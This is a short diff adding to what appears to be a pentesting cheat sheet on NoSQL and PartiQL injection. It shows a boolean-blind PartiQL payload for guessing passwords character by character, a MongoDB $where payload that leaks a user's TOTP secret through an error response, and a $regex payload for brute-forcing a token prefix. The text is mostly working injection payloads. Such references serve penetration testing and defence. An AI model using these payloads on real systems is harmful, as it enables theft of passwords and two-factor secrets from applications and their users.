@@ -21,3 +21,13 @@ asdf' OR (username='<user>' AND begins_with(password,'<char>')) OR '1'='2 -- # e
 ```
 sqlmap doesn't support PartiQL — a small custom script driving the same true/false oracle is usually needed.
 
+Error-based blind extraction via `$where` (MongoDB only, where arbitrary JS runs server-side): throw inside the expression to turn a hidden field into an HTTP error you can read, then brute-force it character by character with `$regex`:
+```bash
+# leak a secret field's value as part of the error response
+GET /api/v1/users.list?query={"$where":"this.username==='<user>' && (()=>{ throw this.services.totp.secret })()"}
+
+# then brute-force a known-prefix value blindly
+POST /anon-endpoint  {"token":{"$regex":"^<prefix>"}}
+```
+
+
